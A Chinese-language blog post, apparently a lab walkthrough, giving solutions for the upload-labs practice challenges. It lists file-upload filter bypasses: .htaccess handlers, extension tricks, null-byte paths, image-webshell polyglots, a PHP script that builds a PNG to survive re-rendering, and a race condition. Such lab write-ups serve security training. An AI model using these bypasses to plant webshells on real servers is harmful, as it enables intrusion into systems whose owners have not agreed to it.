@@ -1,0 +1,241 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>2023/08/03：upload-lab记录 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="Pass 1F12查看前端，可知仅为前端过滤，浏览器禁用脚本即可 Pass 2MIME检测抓包更改type字段即可 Pass 3后缀名检测更改文件后缀即可，如把php改为php5 Pass 4黑名单绕过.htaccess文件绕过生成文件.htaccess写入SetHandler application&#x2F;x-httpd-php将该文件上传至服务器修改一句话木马为图片后缀 Pass 5黑名单绕过过滤为">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2023&#x2F;08&#x2F;03：upload-lab记录">
+<meta property="og:url" content="http://example.com/2023/08/03/upload-lab/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Pass 1F12查看前端，可知仅为前端过滤，浏览器禁用脚本即可 Pass 2MIME检测抓包更改type字段即可 Pass 3后缀名检测更改文件后缀即可，如把php改为php5 Pass 4黑名单绕过.htaccess文件绕过生成文件.htaccess写入SetHandler application&#x2F;x-httpd-php将该文件上传至服务器修改一句话木马为图片后缀 Pass 5黑名单绕过过滤为">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-08-03T15:19:20.000Z">
+<meta property="article:modified_time" content="2023-08-09T11:50:02.493Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-upload-lab" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/08/03/upload-lab/" class="article-date">
+  <time datetime="2023-08-03T15:19:20.000Z" itemprop="datePublished">2023-08-03</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      2023/08/03：upload-lab记录
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h2 id="Pass-1"><a href="#Pass-1" class="headerlink" title="Pass 1"></a>Pass 1</h2><p>F12查看前端，可知仅为前端过滤，浏览器禁用脚本即可</p>
+<h2 id="Pass-2"><a href="#Pass-2" class="headerlink" title="Pass 2"></a>Pass 2</h2><p>MIME检测<br>抓包更改type字段即可</p>
+<h2 id="Pass-3"><a href="#Pass-3" class="headerlink" title="Pass 3"></a>Pass 3</h2><p>后缀名检测<br>更改文件后缀即可，如把php改为php5</p>
+<h2 id="Pass-4"><a href="#Pass-4" class="headerlink" title="Pass 4"></a>Pass 4</h2><p>黑名单绕过<br>.htaccess文件绕过<br>生成文件.htaccess写入<code>SetHandler application/x-httpd-php</code><br>将该文件上传至服务器<br>修改一句话木马为图片后缀</p>
+<h2 id="Pass-5"><a href="#Pass-5" class="headerlink" title="Pass 5"></a>Pass 5</h2><p>黑名单绕过<br>过滤为删除文件名末尾的点，可以将后缀设置为<code>.PHP</code></p>
+<h2 id="Pass-6"><a href="#Pass-6" class="headerlink" title="Pass 6"></a>Pass 6</h2><p>黑名单空格绕过<br><code>1.php </code></p>
+<h2 id="Pass-7"><a href="#Pass-7" class="headerlink" title="Pass 7"></a>Pass 7</h2><p>黑名单点绕过<br>可该为<code>1.php.</code></p>
+<h2 id="Pass-8"><a href="#Pass-8" class="headerlink" title="Pass 8"></a>Pass 8</h2><p>黑名单<code>::$DATA</code><br><code>1.php.</code>或<code>1.php::$DATA</code></p>
+<h2 id="Pass-9"><a href="#Pass-9" class="headerlink" title="Pass 9"></a>Pass 9</h2><p>黑名单绕过<br><code>1.php::$DATA</code></p>
+<h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass 10"></a>Pass 10</h2><p>双写绕过<br><code>1.pphphp</code></p>
+<h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass 11"></a>Pass 11</h2><p>白名单<br>查看源码，发现文件路径可控<br><code>save_path=../upload/1.php%00</code><br><code>filename=&quot;1.png&quot;</code></p>
+<h2 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass 12"></a>Pass 12</h2><p>与上题类似，但这次改为POST传递save-path</p>
+<h2 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass 13"></a>Pass 13</h2><p>该题需要生成图片马<br>源代码会检查文件头两个字节<br>可在cmd中执行<code>copy shelltry.jpg /b + webshell.php /a test.jpg</code>并将其上传，后点击“文件包含漏洞”链接进入利用文件包含漏洞读取文件</p>
+<h2 id="Pass-14-amp-15"><a href="#Pass-14-amp-15" class="headerlink" title="Pass 14 &amp; 15"></a>Pass 14 &amp; 15</h2><p>在上一题的图片马加上文件头（如gif文件需在文件内加<code>GIF89a</code>字段），也可直接上传php后拦截修改</p>
+<h2 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass 16"></a>Pass 16</h2><p>二次渲染绕过<br>来源：<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_72755466/article/details/128499580?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169131954216800182737096%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169131954216800182737096&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-128499580-null-null.142%5Ev92%5EchatsearchT0_1&amp;utm_term=upload-labs%E9%80%9A%E5%85%B3&amp;spm=1018.2226.3001.4187">https://blog.csdn.net/m0_72755466/article/details/128499580?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169131954216800182737096%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169131954216800182737096&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-128499580-null-null.142^v92^chatsearchT0_1&amp;utm_term=upload-labs%E9%80%9A%E5%85%B3&amp;spm=1018.2226.3001.4187</a><br>GIF:<br>首先将GIF文件与php一句话木马合并，再将上传后的文件下载与合并后的文件对比（如010_Editor），在未被渲染的部分写一句话木马<br>PNG:<br>需要脚本构造图片</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,</span><br><span class="line">           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,</span><br><span class="line">           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,</span><br><span class="line">           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,</span><br><span class="line">           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,</span><br><span class="line">           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,</span><br><span class="line">           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,</span><br><span class="line">           0x66, 0x44, 0x50, 0x33);</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">$img = imagecreatetruecolor(32, 32);</span><br><span class="line"> </span><br><span class="line">for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;</span><br><span class="line">   $r = $p[$y];</span><br><span class="line">   $g = $p[$y+1];</span><br><span class="line">   $b = $p[$y+2];</span><br><span class="line">   $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class="line">   imagesetpixel($img, round($y / 3), 0, $color);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">imagepng($img,&#x27;./1.png&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+<p>1.准备png图片<br>2.在cmd使用php命令执行该脚本生成新png图片<br>3.使用新图片上传<br>4.在文件包含漏洞处进行传参</p>
+<h2 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass 17"></a>Pass 17</h2><p>这关存在逻辑漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if(move_uploaded_file($temp_file, $upload_file))&#123;</span><br><span class="line">        if(in_array($file_ext,$ext_arr))&#123;</span><br><span class="line">             $img_path = UPLOAD_PATH . &#x27;/&#x27;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext;</span><br><span class="line">             rename($upload_file, $img_path);</span><br><span class="line">             $is_upload = true;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;;</span><br><span class="line">            unlink($upload_file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $msg = &#x27;上传出错！&#x27;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>在对输入进行验证之前已经将文件移入上传文件夹，可以采用条件竞争<br>用burp拦截数据包发送到测试器模块，在另一个浏览器不断在上传文件的url刷新直到访问成功即可</p>
+<h2 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass 18"></a>Pass 18</h2><p>审计代码，该代码会先进行文件类型匹配，通过后移动到upload同级目录，再对文件重命名；而在能通过白名单的后缀中，<code>.7z</code>不会被浏览器解析，利用浏览器遇到不能解析的后缀向前解析的特性考虑构造<code>1.php.7z</code>，使用Pass 17的方式尝试上传访问该文件</p>
+<h2 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass 19"></a>Pass 19</h2><p>定义了黑名单但没有小写转换，仅对保存文件名黑名单处理<br>可以直接大写绕过<code>1.PHP</code></p>
+<h2 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass 20"></a>Pass 20</h2><p>首先会进行MIME检查，之后会对save_name最后一项进行检查<br>因此，抓包后设置<code>save_name[0]</code>与<code>save_name[2]</code>，前者将文件类型设置为php，后者设置为与MIME对应的文件类型</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2023/08/03/upload-lab/" data-id="cll59g8v10001agud61iv6pwc" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2023/08/10/sstinote/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          2023/08/10：ssti笔记
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2023/07/28/sstilab/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">2023/7/28：sstilab记录</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">March 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/01/">January 2023</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2023/08/10/xssnote/">2023/08/10：xss笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2023/08/10/uploadnote/">2023/08/10：upload笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2023/08/10/sstinote/">2023/08/10：ssti笔记</a>
+          </li>
+        
+          <li>
+            <a href="/2023/08/03/upload-lab/">2023/08/03：upload-lab记录</a>
+          </li>
+        
+          <li>
+            <a href="/2023/07/28/sstilab/">2023/7/28：sstilab记录</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2023 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
